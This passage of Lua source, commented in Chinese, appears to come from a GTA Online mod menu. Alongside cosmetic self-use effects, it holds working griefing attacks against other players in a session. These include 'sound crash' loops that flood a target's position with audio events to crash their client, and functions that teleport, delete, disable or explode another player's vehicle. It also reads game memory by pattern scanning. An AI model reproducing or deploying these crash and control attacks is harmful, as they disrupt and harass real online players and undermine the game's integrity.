        request_model(bush_hash)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end
----声音崩溃
function sound_crash()
    for pid = 0, 31 do
        local TPP = PLAYER.GET_PLAYER_PED(pid)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
        local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
            end
            util.yield()
            for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
            end
            util.yield()
        end
    end
end



-------射出npc
local replayInterface1 = memory.read_long(memory.rip(memory.scan("48 8D 0D ? ? ? ? 48 8B D7 E8 ? ? ? ? 48 8D 0D ? ? ? ? 8A D8 E8 ? ? ? ? 84 DB 75 13 48 8D 0D") + 3))
local pedInterface1 = memory.read_long(replayInterface1 + 0x0018)
function shechuNPC()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
	local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
	if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then 
		pedspawn = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
		ENTITY.SET_ENTITY_ROTATION(pedspawn, rot.x, rot.y, rot.z, 1, false)
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(pedspawn, 1, 0, 1000, 0, false, true, true, true)
	end
    local pedamount = memory.read_int(pedInterface1 + 0x0110)
    if pedamount > 240 then
        Normal_clearance()
    end
end


------------传送载具
----传送载具到导航点
function tp_player_car_to_point(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local waypoint = HUD.GET_BLIP_INFO_ID_COORD(HUD.GET_FIRST_BLIP_INFO_ID(HUD.GET_WAYPOINT_BLIP_ENUM_ID()))
    local c = waypoint_coord(waypoint.x,waypoint.y,waypoint.z)
    if c.x ~= 0 then
        tp_player_car_to_coords(pid, c)
    end
end
----传送载具到地下
function tp_player_car_to_underground(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local p = PLAYER.GET_PLAYER_PED(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
    if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
        c = waypoint_coord(c.x, c.y, c.z)
        request_control(veh, 3)
        c.z = c.z - 50
        ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false) --tp undermap
    end
end
----传送载具到坐标点
function tp_player_car_to_coords(pid, coord)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true,PLAYER.GET_PLAYER_PED(pid))
    util.yield(1000)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), true)
    if car ~= 0 then
        request_control(car, 3)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(car, coord['x'], coord['y'], coord['z'], false, false, false)
    end
    NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(false,PLAYER.GET_PLAYER_PED(pid))
end



---------载具随机升级
function randomupdatcar(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
    request_control(vehicle, 3)
    VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
    for x = 0, 49 do
        local max = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, x)
        VEHICLE.SET_VEHICLE_MOD(vehicle, x, math.random(-1, max))
    end
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(-1,5))
    for x = 17, 22 do
        VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, x, math.random() > 0.5)
    end
    VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
    VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
    util.yield(500)
end

--------旋转的陀螺
function carspin(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), true)
    if car ~= 0 then
        request_control(car, 3)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(car, 4, 0.0, 0.0, 300.0, 0, true, true, false, true, true, true)
    end
end


-------电磁脉冲
function caremp(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), true)
    if car ~= 0 then
        local c = ENTITY.GET_ENTITY_COORDS(car)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, 83, 100.0, false, true, 0.0)
    end
end




----删除玩家载具
function deleplayercar(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player = PLAYER.GET_PLAYER_PED(pid)
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(player)
    request_control(player_veh, 3)
    if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(player_veh) then
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(player_veh, false, false)
        delete_entity(player_veh)
    end
end
----禁用载具
function disable_vehicle(pid)
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
        if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
        if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED(pid)) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED(pid))
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(PLAYER.GET_PLAYER_PED(pid))
            delete_entity(veh2)
        end
    end
end
----禁用驾驶
function disable_drive(toggled, pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
    request_control(vehicle, 3)
    VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, toggled)
end


--声音崩溃V1
function soundcrashv1(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local pos=ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1,"10s",pos.x,pos.y,pos.z,"MP_MISSION_COUNTDOWN_SOUNDSET",true, 70, false)
            end
            util.yield(0)
        end
    end 

--声音崩溃V2
function soundcrashv2(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), true)
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Event_Message_Purple', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
            end
            util.yield()
        end	
    end


------踢出载具v1
function kickcar(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED(pid), false) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
        request_control(vehicle, 3)
        DECORATOR.DECOR_REGISTER("Player_Vehicle", 3)
        DECORATOR.DECOR_SET_INT(vehicle,"Player_Vehicle", 0)
    end
end

----强制丢弃武器
function force_discard_weapon()
    if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) ~= util.joaat("WEAPON_UNARMED") then
        if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == util.joaat("WEAPON_BZGAS") or 
            WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == util.joaat("WEAPON_FIREEXTINGUISHER") or 
            WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == util.joaat("WEAPON_SNOWBALL") then
            WEAPON.REMOVE_WEAPON_FROM_PED(PLAYER.PLAYER_PED_ID(), WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()))
        else
            WEAPON.SET_PED_DROPS_INVENTORY_WEAPON(PLAYER.PLAYER_PED_ID(), WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()), 0, 1.0, 0.0, 0)
        end
    end
end

------自动加血
function autoBloodReture()
    local health = ENTITY.GET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID())
    if ENTITY.GET_ENTITY_MAX_HEALTH(PLAYER.PLAYER_PED_ID()) == health then return end
    ENTITY.SET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID(), health + 5, 0)
    util.yield(255)
end

-------在掩体后时补充生命值
function healthincover(toggled)
    restore_health = toggled
    while restore_health do
        if PED.IS_PED_IN_COVER(PLAYER.PLAYER_PED_ID(), false) then
            PLAYER1._SET_PLAYER_HEALTH_RECHARGE_LIMIT(PLAYER.PLAYER_ID(), 1.0)
            PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(PLAYER.PLAYER_ID(), 15.0)
        else
            PLAYER1._SET_PLAYER_HEALTH_RECHARGE_LIMIT(PLAYER.PLAYER_ID(), 0.5)
            PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(PLAYER.PLAYER_ID(), 1.0)
        end
        util.yield()
    end
    PLAYER1._SET_PLAYER_HEALTH_RECHARGE_LIMIT(PLAYER.PLAYER_ID(), 0.25)
    PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(PLAYER.PLAYER_ID(), 1.0)
end

---------好友列表
local online_friends = {}
function get_friend_list()
    for i = 0 , NETWORK.NETWORK_GET_FRIEND_COUNT() do
        local stst = ""
        local name = NETWORK.NETWORK_GET_FRIEND_NAME(i)
        
        if name ~= "*****" then
            if NETWORK.NETWORK_IS_FRIEND_ONLINE(name) then
                stst = " [在线]"
            end
            if online_friends[i] ~= nil then--判断重复
                menu.set_menu_name(online_friends[i], name..stst)
            else
                online_friends[i] = menu.list(frendlist, name..stst, {}, "")
                    if online_friends[i] then--下拉列表
                        menu.divider(online_friends[i] , name)
                        menu.action(online_friends[i],"加入战局", {}, "",function()
                            menu.trigger_commands("join "..name)
                        end)
                        menu.action(online_friends[i],"观看玩家", {}, "",function()
                            menu.trigger_commands("namespectate "..name)
                        end)
                        menu.action(online_friends[i],"邀请玩家", {}, "",function()
                            menu.trigger_commands("invite "..name)
                        end)
                        menu.action(online_friends[i],"玩家档案", {}, "",function()
                            menu.trigger_commands("nameprofile "..name)
                        end)
                        menu.readonly(online_friends[i], "复制昵称: ", name)
                    end
            end 
        end
    end
end


----战局切换
function switch_session(SessionType, id)
    --正常切换战局，修改战局类型
    SET_INT_GLOBAL(SessionType, id)
    --切换战局状态
    SET_INT_GLOBAL(Global_Base.SessionSwitchState, 1)
    util.yield(200)
    SET_INT_GLOBAL(Global_Base.SessionSwitchState, 0)
end


----发送妓女
function send_hooker(index, pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -5.0, 0.0, 0.0)
    local hooker = 0
    if index == 1 then
        hooker = PED.CLONE_PED(PLAYER.GET_PLAYER_PED(pid), true, false, true)
    elseif index == 2 then
        request_model(util.joaat('cs_lestercrest'))
        hooker = entities.create_ped(28, util.joaat('cs_lestercrest'), c, math.random(270))
    elseif index == 3 then
        request_model(util.joaat('cs_tracydisanto'))
        hooker = entities.create_ped(28, util.joaat('cs_tracydisanto'), c, math.random(270))
    elseif index == 4 then
        request_model(util.joaat('csb_agatha'))
        hooker = entities.create_ped(28, util.joaat('csb_agatha'), c, math.random(270))
    elseif index == 5 then
        request_model(util.joaat('a_f_y_topless_01'))
        hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
        PED.SET_PED_COMPONENT_VARIATION(hooker, 8, 1, 1, 1)
    end

    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -5.0, 0.0, 0.0)
    ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
    TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
end

------获取导弹
function dd02(value, menu_name, click_type)
    if value == 1 then
        attach_to_player("prop_cs_dildo_01", 57597, -0.1, 0.15, 0, 0, 90, 90)
    elseif value == 2 then
        attach_to_player("prop_ld_bomb_01", 57597, -0.1, 0.6, 0, 0, 180, 180)
    elseif value == 3 then
        attach_to_player("prop_sam_01", 57597, -0.1, 1.7, 0, 0, 180, 180)
    elseif value == 4 then
        attach_to_player("h4_prop_h4_airmissile_01a", 57597, -0.1, 0, 0, 0, 180, 180)
    elseif value == 5 then
        for k, model in pairs(obj_pp.value) do 
            delete_object(model)
        end
    end
end

----龙息
local DragonPtfx
function Dragon_Breath()
    request_ptfx_asset("veh_xs_vehicle_mods")
    if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) then
        if PAD.IS_CONTROL_PRESSED(0, 206) then
            if not GRAPHICS.DOES_PARTICLE_FX_LOOPED_EXIST(DragonPtfx) then
                DragonPtfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("veh_nitrous", PLAYER.PLAYER_PED_ID(), -0.01, 0.15, 0.0, 0.0, 0.0, 180.0, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 31086), 0.5, false, false, false, 0, 0, 0, 255)
            end
        else
            if GRAPHICS.DOES_PARTICLE_FX_LOOPED_EXIST(DragonPtfx) then
                GRAPHICS.REMOVE_PARTICLE_FX(DragonPtfx)
            end
        end
    end
end

-------喷火
function firewingscale(value)
    fireWings3Settings.scale = value / 10
end
function firewingcolour(colour)
    fireWings3Settings.colour = colour
end
fireBreathSettings = {
    scale = 0.3,
    colour = {r = 1, g = 127 / 255, b = 127 / 255, a = 1},
    on = false,
    y = { value = 0.12, still = 0.12, walk =  0.22, sprint = 0.32, sneak = 0.35 },
    z = { value = 0.58, still = 0.58, walk =  0.45, sprint = 0.38, sneak = 0.35 },
}
function transitionValue(value, target, step)
    if value == target then return value end
    return value + step * ( value > target and -1 or 1 )
end
function fireBreathSettings:changePos(movementType)
    self.z.value = transitionValue(self.z.value, self.z[movementType], 0.01)
    self.y.value = transitionValue(self.y.value, self.y[movementType], 0.01)
end
function firebreathxxx(toggle)
    if toggle then
        request_ptfx_asset('weap_xs_vehicle_weapons')
        GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
        fireBreathSettings.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', PLAYER.PLAYER_PED_ID(), 0, 0.12, 0.58, 30, 0, 0, 0x8b93, fireBreathSettings.scale, false, false, false, 0, 0, 0, 0)
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b, false)
    else
        GRAPHICS.STOP_PARTICLE_FX_LOOPED(fireBreathSettings.ptfx, false)
        GRAPHICS.REMOVE_PARTICLE_FX(fireBreathSettings.ptfx, true)
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
    end
end
function firebreathscale(value)
    fireBreathSettings.scale = value / 10
    GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireBreathSettings.ptfx, fireBreathSettings.scale)
end
function firebreathcolour(colour)
    fireBreathSettings.colour = colour
    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b, false)
end

----显示准星
function front_sight(str)
    --默认准星 HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
    --自定义准星
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 255, 255, 255)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT(str)
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.478,0)
end

----瞄准惩罚
local whitelistGroups = {user = true, friends = true, strangers  = true}
karma = {}
function isAnyPlayerTargetingEntity(playerPed)
    for k, playerPid in pairs(players.list(false, true, true)) do
        if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
            karma[playerPed] = {
                pid = playerPid,
                ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
            }
            return true
        end
    end
    karma[playerPed] = nil
    return false
end


----轨迹
local locus_colour = {r = 1.0, g = 0.0, b = 1.0, a = 1.0}
function locus_color(newColour)
    locus_colour = newColour
end
function Character_locus()
    request_ptfx_asset("scr_rcpaparazzo1")
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        local minimum, maximum = v3.new(), v3.new()
        MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), minimum, maximum)
        local offsets = {v3(minimum.x, minimum.y, 0.0), v3(maximum.x, minimum.y, 0.0)}
        for _, offset in ipairs(offsets) do
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcpaparazzo1")
            local fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY("scr_mich4_firework_sparkle_spawn", vehicle, offset.x, offset.y, 0.0, 0.0, 0.0, 0.0, 0.7, false, false, false)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(locus_colour.r, locus_colour.g, locus_colour.b)
        end
    elseif ENTITY.DOES_ENTITY_EXIST(PLAYER.PLAYER_PED_ID()) then
        for _, boneId in ipairs(bones) do
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcpaparazzo1")
            local fx = GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE("scr_mich4_firework_sparkle_spawn",PLAYER.PLAYER_PED_ID(),0.0,0.0,0.0,0.0,0.0,0.0,PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), boneId),0.7,false, false, false)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(locus_colour.r, locus_colour.g, locus_colour.b)
        end
    end
end

----生成小实体
function create_small_entities(pid, index)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local target_ped = PLAYER.GET_PLAYER_PED(pid)
    if index == 1 then
        local hash = 2282807134
        request_model(hash)
        local ramp = spawn_object_in_front_of_ped(target_ped, hash, 90, 50.0, -1, true)
        local c = ENTITY.GET_ENTITY_COORDS(ramp, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ramp, c['x'], c['y'], c['z']-0.2, false, false, false)
    elseif index == 2 then
        local hash = 3729169359
        local obj = spawn_object_in_front_of_ped(target_ped, hash, 0, 5.0, -0.5, false)
        ENTITY.FREEZE_ENTITY_POSITION(obj, true)
    elseif index == 3 then
        local hash = 1952396163
        local obj = spawn_object_in_front_of_ped(target_ped, hash, 0, 5.0, -30, false)
        ENTITY.FREEZE_ENTITY_POSITION(obj, true)
    elseif index == 4 then
        local hash = 2306058344
        local obj = spawn_object_in_front_of_ped(target_ped, hash, 0, 0.0, -5.0, false)
        ENTITY.FREEZE_ENTITY_POSITION(obj, true)
    end
end

--------激光眼
function laser_eyes()
    local weaponHash = util.joaat("weapon_heavysniper_mk2")
    local dictionary = "weap_xs_weapons"
    local ptfx_name = "bullet_tracer_xs_sr"
    local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    if PAD.IS_CONTROL_PRESSED(0, 51) then--E
        local inst = v3.new()
        local final_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
        v3.set(inst, final_rot.x,final_rot.y,final_rot.z)
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
        local final_coord = CAM.GET_FINAL_RENDERED_CAM_COORD()
        v3.set(tmp, final_coord.x,final_coord.y,final_coord.z)
        v3.add(inst, tmp)
        local camAim_x, camAim_y, camAim_z = v3.get(inst)
        --判断模型的BONE_INDEX是否匹配
        local left_eye_id = 0
        local right_eye_id = 0
        local ped_model = ENTITY.GET_ENTITY_MODEL(PLAYER.PLAYER_PED_ID())
        if ped_model == 1885233650 or ped_model == -1667301416 then
            left_eye_id = 25260
            right_eye_id = 27474
        else
            left_eye_id = 5956
            right_eye_id = 6468
        end

        local boneCoord_L = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), left_eye_id))
        local boneCoord_R = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), right_eye_id))
        if ped_model == util.joaat("mp_f_freemode_01") then 
            boneCoord_L.z = boneCoord_L.z + 0.02
            boneCoord_R.z = boneCoord_R.z + 0.02
        end

        camRot.x = camRot.x - 90
        request_ptfx_asset(dictionary)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, PLAYER.PLAYER_PED_ID(), false, true, 100, PLAYER.PLAYER_PED_ID(), 0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, PLAYER.PLAYER_PED_ID(), false, true, 100, PLAYER.PLAYER_PED_ID(), 0)
    end
end

--------原力
function get_ped_nearby_vehicles(ped, maxVehicles)
	maxVehicles = maxVehicles or 16
	local pVehicleList = memory.alloc((maxVehicles + 1) * 8)
	memory.write_int(pVehicleList, maxVehicles)
	local vehiclesList = {}
	for i = 1, PED.GET_PED_NEARBY_VEHICLES(ped, pVehicleList) do
		vehiclesList[i] = memory.read_int(pVehicleList + i*8)
	end
	return vehiclesList
end



-------背藏武器
function attachweapon(spawnweapon)
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 416676503) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 690389602) then
		ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.15, 0, 0.13, 270, 0, 0, false, true, false, false, 1, true, 0)
	end
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -728555052) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -1609580060) then
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_bat")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.3, -0.18, -0.15, 0, 300, 0, false, true, false, false, 1, true, 0)
		end
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_crowbar")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 90, false, true, false, false, 1, true, 0)
		end
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_battleaxe")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true, 0)
		end
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_golfclub")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true, 0)
		end
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hatchet")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true, 0)
		end
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_poolcue")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), -0.2, -0.18, 0.1, 0, 120, 0, false, true, false, false, 1, true, 0)
		end
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stone_hatchet")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true, 0)
		end
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_knuckle")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 90, false, true, false, false, 1, true, 0)
		end
		if not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_bat"))  and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_crowbar")) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_battleaxe"))and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_golfclub")) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hatchet")) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_poolcue")) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stone_hatchet")) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_knuckle")) then
